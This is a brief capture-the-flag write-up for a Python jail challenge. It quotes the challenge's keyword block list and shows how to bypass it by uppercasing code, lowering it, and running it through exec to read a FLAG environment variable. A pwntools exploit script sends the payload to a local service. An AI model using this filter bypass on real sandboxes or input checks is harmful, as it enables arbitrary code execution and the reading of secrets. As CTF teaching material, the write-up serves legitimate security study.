# Pyjail

## Overview
To obtain the flag we need to bypass some checks:
```py
if any(x in user_input for x in ["import", "environ", "getenv", "os", "print", "system", "__", "open", "flag"]):
    print("Blocked!")
    continue
```
This is easy to do since we can use `exec` again, write everything in uppercase, and use the `.lower()` function.
```bash
>>> exec("IMPORT OS; PRINT(OS.ENVIRON".lower() + "['FLAG'])")
```

## Exploit
```py
from pwn import remote, context

context.log_level = 'error'

payload = b"exec(\"IMPORT OS; PRINT(OS.ENVIRON\".lower() + \"['FLAG'])\")"

r = remote("127.0.0.1", 6005)
r.recvuntil(b">>> ")
r.sendline(payload)
flag = r.recvline().decode().strip()
r.close()

print(flag)
```